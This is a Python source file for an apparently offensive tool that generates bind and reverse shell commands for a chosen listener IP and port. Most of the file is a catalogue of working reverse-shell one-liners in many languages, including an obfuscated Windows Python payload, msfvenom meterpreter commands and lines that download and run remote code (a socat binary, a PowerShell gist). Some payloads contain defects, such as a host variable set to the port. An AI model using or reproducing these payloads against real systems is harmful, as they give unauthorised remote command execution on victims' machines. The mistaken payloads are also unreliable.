#!/usr/bin/env python3
# Author: Charlie BROMBERG (Shutdown - @_nwodtuhs)

'''
Inspired by : https://github.com/sameera-madushan/Print-My-Shell
Reverse shells found on :
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
- https://ashr.net/bind/and/reverse/shell/cheatsheet/windows/and/linux.aspx
- https://krober.biz/misc/reverse_shell.php
'''

import argparse
import sys
import re
import psutil
import socket
from colorama import Fore
from colorama import Style
import platform
if platform.system() == 'Windows':
    from consolemenu import *
else:
    from simple_term_menu import TerminalMenu

def MENU_shelltype(shelltype):
    shells_dict = globals()[shelltype]
    menu_list = sorted(list(shells_dict.keys()))

    if platform.system() == 'Windows':
        selection = SelectionMenu.get_selection(menu_list, title='What type of shell do you want?', show_exit_option=False)
    else:
        menu = TerminalMenu(menu_list, title='What type of shell do you want?')
        selection = menu.show()

    return menu_list[selection]

def MENU_interface():
    interfaces = {}
    net_if_addrs = psutil.net_if_addrs()
    for iface, addr in net_if_addrs.items():
        if iface == 'lo':
            continue
        for address in addr:
            if address.family == socket.AF_INET:
                interfaces.update({iface:address.address})

    menu_list = []
    for key in interfaces:
        menu_list.append(key + ' (' + interfaces[key] + ')')
    menu_list.append('Custom')

    if platform.system() == 'Windows':
        selection = SelectionMenu.get_selection(menu_list, title='Interface?', show_exit_option=False)
    else:
        menu = TerminalMenu(menu_list, title='Interface?')
        selection = menu.show()

    selection = menu_list[selection]

    if selection == 'Custom':
        print('Custom address?')
        if platform.system() == 'Windows':
            selection = input('>> ')
        else:
            selection = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL)
        sys.stdout.write("\033[F") #back to previous line
        sys.stdout.write("\033[K") #clear line
        sys.stdout.write("\033[F") #back to previous line
        sys.stdout.write("\033[K") #clear line
        return selection
    else:
        return selection.split(' ')[1].replace('(', '').replace(')', '')

def MENU_port():
    ports = {
        'Default':'1337',
        'HTTP':'80',
        'HTTPS':'443',
        'DNS':'53'
    }

    menu_list = []
    for key in ports:
        menu_list.append(key + ' (' + ports[key] + ')')
    menu_list.append('Custom')

    if platform.system() == 'Windows':
        selection = SelectionMenu.get_selection(menu_list, title='Port?', show_exit_option=False)
    else:
        menu = TerminalMenu(menu_list, title='Port?')
        selection = menu.show()

    selection = menu_list[selection]

    if selection == 'Custom':
        print('Custom port?')
        if platform.system() == 'Windows':
            selection = input('>> ')
        else:
            selection = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL)
        sys.stdout.write("\033[F") #back to previous line
        sys.stdout.write("\033[K") #clear line
        sys.stdout.write("\033[F") #back to previous line
        sys.stdout.write("\033[K") #clear line
        return selection
    else:
        return selection.split(' ')[1].replace('(', '').replace(')', '')

def list_shells():
    print('Reverse shells')
    for shell in sorted(revshells.keys()):
        print('   - ' + shell)
    print('\nBind shells')
    for shell in sorted(bindshells.keys()):
        print('   - ' + shell)
    quit()

def get_options():
    parser = argparse.ArgumentParser(description='Generate a bind/reverse shell', formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-l', '--list', dest='LIST', action='store_true', help='Print all the types of shells shellerator can generate')
    # Can't choose bind shell and reverse shell
    shelltype = parser.add_mutually_exclusive_group()
    shelltype.add_argument('-b', '--bind-shell', dest='SHELLTYPE', action='store_const', const='bindshells', help='Generate a bind shell (you connect to the target)')
    shelltype.add_argument('-r', '--reverse-shell', dest='SHELLTYPE', action='store_const', const='revshells', help='Generate a reverse shell (the target connects to you) (Default)')
    # Sets reverse shell as default value for SHELLTYPE (https://stackoverflow.com/questions/38507675/python-argparse-mutually-exclusive-group-with-default-if-no-argument-is-given)
    parser.set_defaults(SHELLTYPE = 'revshells')
    # Creates group of options for bindshell
    bindshell = parser.add_argument_group('Bind shell options')
    # typeoptions and portoption are two options either bindshell or revshell will need (https://stackoverflow.com/questions/23775378/allowing-same-option-in-different-argparser-group)
    typeoption = bindshell.add_argument('-t', '--type', dest='TYPE', type=str.lower, help='Type of the shell to generate (Bash, Powershell, Java...)')
    portoption = bindshell.add_argument('-p', '--port', dest='LPORT', type=int, help='Listener Port')
    revshell = parser.add_argument_group('Reverse shell options')
    revshell._group_actions.append(typeoption)
    revshell.add_argument('-i', '--ip', dest='LHOST', type=str, help='Listener IP address')
    revshell._group_actions.append(portoption)
    options = parser.parse_args()
    if options.LIST:
        list_shells()
    if options.SHELLTYPE == 'revshells' and not options.LHOST:
        options.LHOST = MENU_interface()
    if not options.LPORT:
        options.LPORT = MENU_port()
    else:
        options.LPORT = str(options.LPORT)
    if not options.TYPE:
        options.TYPE = MENU_shelltype(options.SHELLTYPE)
    return options

# Helper function for populate_shells() to add values to the dictionnaries
def add_shell(shells_dict, type, shell, notes=None):
    if not type in shells_dict.keys():
        shells = []
    else:
        shells = shells_dict[type]
    shells.append((notes, shell))
    shells_dict.update({type:shells})

# Add shells to the main dictionnaries: revshells and bindshells
def populate_shells():
    add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' ''')
    add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<&1 2>&1' ''')
    add_shell(revshells, 'bash', '''/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<& 2>&1''')
    add_shell(revshells, 'bash', '''bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1''')
    add_shell(revshells, 'bash', '''exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done''')
    add_shell(revshells, 'bash', '''exec /bin/sh 0</dev/tcp/{LHOST}/{LPORT} 1>&0 2>&0''')
    add_shell(revshells, 'bash', '''0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196''')
    add_shell(shells_dict=revshells, type='bash', notes='UDP', shell='''bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1''')
    add_shell(shells_dict=revshells, type='bash', notes='UDP Listener (attacker)', shell='''nc -u -lvp {LPORT}''')
    add_shell(revshells, 'netcat', '''nc -e /bin/sh {LHOST} {LPORT}''')
    add_shell(revshells, 'netcat', '''nc -e /bin/bash {LHOST} {LPORT}''')
    add_shell(revshells, 'netcat', '''nc -c bash {LHOST} {LPORT}''')
    add_shell(revshells, 'netcat', '''mknod backpipe p && nc {LHOST} {LPORT} 0<backpipe | /bin/bash 1>backpipe ''')
    add_shell(revshells, 'netcat', '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f''')
    add_shell(revshells, 'netcat', '''rm -f /tmp/p; mknod /tmp/p p && nc {LHOST} {LPORT} 0/tmp/p 2>&1''')
    add_shell(revshells, 'netcat', '''rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} > f''')
    add_shell(revshells, 'netcat', '''rm -f x; mknod x p && nc {LHOST} {LPORT} 0<x | /bin/bash 1>x''')
    add_shell(revshells, 'ncat', '''ncat {LHOST} {LPORT} -e /bin/bash''')
    add_shell(revshells, 'ncat', '''ncat --udp {LHOST} {LPORT} -e /bin/bash''')
    add_shell(revshells, 'telnet', '''rm -f /tmp/p; mknod /tmp/p p && telnet {LHOST} {LPORT} 0/tmp/p 2>&1''')
    add_shell(revshells, 'telnet', '''telnet {LHOST} {LPORT} | /bin/bash | telnet {LHOST} 667''')
    add_shell(revshells, 'telnet', '''rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {LHOST} {LPORT} > f''')
    add_shell(revshells, 'telnet', '''rm -f x; mknod x p && telnet {LHOST} {LPORT} 0<x | /bin/bash 1>x''')
    add_shell(revshells, 'socat', '''/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}''')
    add_shell(revshells, 'socat', '''socat tcp-connect:{LHOST}:{LPORT} exec:"bash -li",pty,stderr,setsid,sigint,sane''')
    add_shell(revshells, 'socat', '''wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}''')
    add_shell(shells_dict=revshells, type='socat', notes='Listener (attacker)', shell='''socat file:`tty`,raw,echo=0 TCP-L:{LPORT}''')
    add_shell(revshells, 'perl', '''perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ''')
    add_shell(revshells, 'perl', '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''')
    add_shell(shells_dict=revshells, type='perl', notes='Windows', shell='''perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''')
    add_shell(revshells, 'python', '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
    add_shell(revshells, 'python', '''export RHOST="{LHOST}";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' ''')
    add_shell(revshells, 'python', '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' ''')
    add_shell(shells_dict=revshells, type='python', notes='Windows', shell='''C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{LHOST}', {LPORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"''')
    add_shell(revshells, 'php', '''php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});`/bin/sh -i <&3 >&3 2>&3`;' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});system("/bin/sh -i <&3 >&3 2>&3");' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");' ''')
    add_shell(revshells, 'php', '''php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}' ''')
    add_shell(revshells, 'ruby', '''ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''')
    add_shell(revshells, 'ruby', '''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' ''')
    add_shell(shells_dict=revshells, type='ruby', notes='Windows', shell='''ruby -rsocket -e 'c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' ''')
    add_shell(revshells, 'openssl', '''mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s''')
    add_shell(shells_dict=revshells, type='openssl', notes='Listener (attacker)', shell='''ncat --ssl -vv -l -p {LPORT}''')
    add_shell(revshells, 'powershell', '''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()''')
    add_shell(revshells, 'powershell', '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"''')
    add_shell(revshells, 'powershell', '''powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')''')
    add_shell(revshells, 'awk', '''awk 'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null''')
    add_shell(revshells, 'tclsh', '''echo 'set s [socket {LHOST} {LPORT}];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh''')
    add_shell(revshells, 'java', '''r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()''')
    add_shell(revshells, 'java', '''String host="{LPORT}";
int port={LPORT};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''')
    add_shell(shells_dict=revshells, type='java', notes='More stealthy', shell='''Thread thread = new Thread(){public void run(){        //Reverse shell here        }}thread.start();''')
    add_shell(revshells, 'war', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file''')
    add_shell(shells_dict=revshells, type='lua', notes='Linux', shell='''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"''')
    add_shell(shells_dict=revshells, type='lua', notes='Windows', shell='''lua5.1 -e 'local host, port = "{LHOST}", {LPORT} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' ''')
    add_shell(revshells, 'nodejs', '''require('child_process').exec('nc -e /bin/sh {LHOST} {LPORT}')''')
    add_shell(revshells, 'nodejs', '''-var x = global.process.mainModule.require
-x('child_process').exec('nc {LHOST} {LPORT} -e /bin/bash')''')
    add_shell(revshells, 'nodejs', '''(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({LPORT}, "{LHOST}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();''')
    add_shell(revshells, 'groovy', '''String host="{LHOST}";
int port={LPORT};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''')
    add_shell(shells_dict=revshells, type='groovy', notes='More stealthy', shell='''Thread.start {        // Reverse shell here        }''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f elf > shell.elf''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f exe > shell.exe''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p osx/x86/shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f macho > shell.macho''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f asp > shell.asp''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.jsp''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f war > shell.war''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_python LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.py''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_bash LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.sh''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_perl LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.pl''')
    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Staged reverse TCP', shell='''msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe''')
    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Stageless reverse TCP', shell='''msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe''')
    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Staged reverse TCP', shell='''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf''')
    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Stageless reverse TCP', shell='''msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf''')

    add_shell(bindshells, 'netcat', '''nc -lvp {LPORT} -e /bin/sh''')

if __name__ == '__main__':
    revshells = {}
    bindshells = {}
    populate_shells()
    options = get_options()
    shells_dict = globals()[options.SHELLTYPE]
    print()
    for notes, shell in shells_dict[options.TYPE]:
        shell_index = shells_dict[options.TYPE].index((notes, shell)) + 1
        if options.LHOST is not None:
            print_shell = shell.replace('{LHOST}', options.LHOST).replace('{LPORT}', options.LPORT).strip()
        else:
            print_shell = shell.replace('{LPORT}', options.LPORT).strip()
        print_notes = ''
        if notes is not None:
            print_notes = notes + ' '
        print(Fore.BLUE + Style.BRIGHT + '[' + str(shell_index) + '] ' + print_notes + Style.RESET_ALL + print_shell + '\n')
